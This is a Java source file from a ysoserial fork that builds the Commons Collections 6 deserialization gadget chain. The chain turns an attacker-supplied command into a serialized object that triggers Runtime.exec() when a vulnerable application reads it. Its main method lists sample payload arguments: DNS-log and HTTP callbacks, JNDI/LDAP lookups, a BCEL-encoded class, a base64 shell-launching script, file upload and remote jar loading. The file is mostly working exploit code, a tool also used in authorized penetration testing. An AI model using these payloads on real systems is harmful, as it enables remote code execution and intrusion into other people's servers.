package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.custom.CommonsCollectionsUtil;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER })
public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {

    public Serializable getObject(final String command) throws Exception {
        final Transformer[] transformers = CommonsCollectionsUtil.getTransformerList(command);
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return map;

    }

    public static void main(String[] args) throws Exception {
        //args = new String[]{"sleep:10"};
        //args = new String[]{"dnslog:xxx.0omga2.dnslog.cn"};
        //args = new String[]{"httplog:http://127.0.0.1:1665/a.xml"};
        //args = new String[]{"linx_cmd:open /System/Applications/Calculator.app/Contents/MacOS/Calculator"};
        //args = new String[]{"bcel:$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$dbN$C1$Q$3d$e5$b6$80$a8$I$e2$fd$86O$60$a2$8d$cf$Y$8d$SMLP$8ck4$c4$a7$b26X$b2t7$bb$c5$e0g$f9$a2$c6D$3f$c0$8f2$ce$f2$80$a8$9dt$d2sf$a6$a7$d3$f9$fcz$fb$A$b0$8b$cd$y2$udQ$c4$ac$85R$gsi$cc$a7$b1$Q$R$8b$W$96$y$y3$a4$f6$94Vf$9f$n$5e$a9$5e3$q$ea$de$9dd$98n$u$z$cf$fb$bd$b6$M$aeD$db$r$s$7b$3cp$a4o$94$a7C$L$x$84m$af$l8$f2DE$c1L$5d$b8$ceNW$3c$88$i$b2$98$b0$b0$9a$c3$g$d6$Z$f2$R$c7$5d$a1$3b$dc6$81$d2$j$G$8b$b7$95$e6$e1$3dCl$dba8$f2$7c$a97$b8$fd$Y$g$d9$e3$87$be$ef$wG$Mexti$df$V$c6$Lv$84$ef$f3$ba$a7$8d$d4$s$e4g$c2i$dac$d1$i6P$8e$9eN$cc$_$c9f$bb$x$j$c3P$iR$ca$e3$a7$cdQ$X$M3$3f$89$97$7dmT$_$ea$b2$p$cd$I$94$w$d5$c6$bf$9c$g$J$c9$81$q$a1J$e5$b6$f1$b7$bd$dax$c5E$e092$Mk$u$pM$83$88$W$p$a3$PB$M9B$HH$S$G$d6$b7$5e$c0$5e$RK$bd$p$de$8a$X$Sv$xQH$da$add$ne$3f$c3$bay$g$WN$92$9fB$9c$7c$82$yI$ff$9b$o$i$n$g$X$ed$3c$9dc$98$f9$G$e8$GDW$fd$B$A$A"};
        //args = new String[]{"bcel_class_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.class"};
        //args = new String[]{"script_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/testfile/JavaScriptTest.js"};
        //args = new String[]{"script_base64:bmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlclsnKGphdmEubGFuZy5TdHJpbmdbXSknXShbJy9iaW4vc2gnLCctYycsJ29wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvciddKS5zdGFydCgp"};
        //args = new String[]{"upload_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/testfile/JavaScriptTest.js|/tmp/JavaScriptTest.js"};
        //args = new String[]{"loadjar:file:///Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.jar|Calc"};
        //args = new String[]{"loadjar_with_args:file:///Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.jar|Calc|open /System/Applications/Calculator.app/Contents/MacOS/Calculator"};
        //args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
        PayloadRunner.run(CommonsCollections6.class, args);
    }
}
